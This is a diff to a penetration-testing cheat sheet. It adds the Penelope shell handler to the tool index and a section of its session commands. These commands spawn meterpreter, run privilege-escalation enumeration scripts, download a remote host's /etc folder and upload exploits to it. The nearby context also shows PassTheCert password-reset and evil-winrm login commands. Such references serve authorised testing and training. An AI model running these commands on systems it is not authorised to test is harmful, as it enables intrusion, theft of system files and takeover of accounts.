@@ -139,6 +139,7 @@ Thank you for reading.
 		- [Linux](#linux-1)
 		- [Microsoft Windows](#microsoft-windows-1)
 		- [PassTheCert](#passthecert)
+		- [Penelope](#Penelope)
 		- [PKINITtools](#pkinittools)
 		- [Port Scanning](#port-scanning-1)
 		- [powercat](#powercat)
@@ -303,6 +304,7 @@ Thank you for reading.
 | nanodump | https://github.com/fortra/nanodump |
 | PassTheCert | https://github.com/AlmondOffSec/PassTheCert |
 | PEASS-ng | https://github.com/carlospolop/PEASS-ng |
+| Penelope | https://github.com/brightio/penelope |
 | PKINITtools | https://github.com/dirkjanm/PKINITtools |
 | powercat | https://github.com/besimorhino/powercat |
 | PowerSharpPack | https://github.com/S3cur3Th1sSh1t/PowerSharpPack |
@@ -6149,6 +6151,22 @@ certipy-ad cert -pfx <CERTIFICATE>.pfx -nokey -out <CERTIFICATE>.crt
 certipy-ad cert -pfx <CERTIFICATE>.pfx -nocert -out <CERTIFICATE>.key
 python3 passthecert.py -domain '<DOMAIN>' -dc-host '<DOMAIN>' -action 'modify_user' -target '<USERNAME>' -new-pass '<PASSWORD>' -crt ./<CERTIFICATE>.crt -key ./<CERTIFICATE>.key
 evil-winrm -i '<RHOST>' -u '<USERNAME>' -p '<PASSWORD>'
+```
+
+#### Penelope
+
+```c
+F12			// Detach shell and go to Main Menu
+i <session number>	// Interact with a session
+```
+
+```c
+┍┽ penelope ┾┑ > run peass_ng		// Run the latest version of PEASS-ng in the background 
+┍┽ penelope ┾┑ > run lse		// Run the latest version of linux-smart-enumeration in the background
+┍┽ penelope ┾┑ > run meterpreter	// Get a meterpreter shell
+┍┽ penelope ┾┑ > download /etc		// Download the remote /etc folder 
+┍┽ penelope ┾┑ > upload https://www.exploit-db.com/exploits/40847	// Upload an exploit to the remote machine
+┍┽ penelope ┾┑ > upload my_scripts_folder				// Upload a local folder to the remote machine
 ```
 
 #### PKINITtools
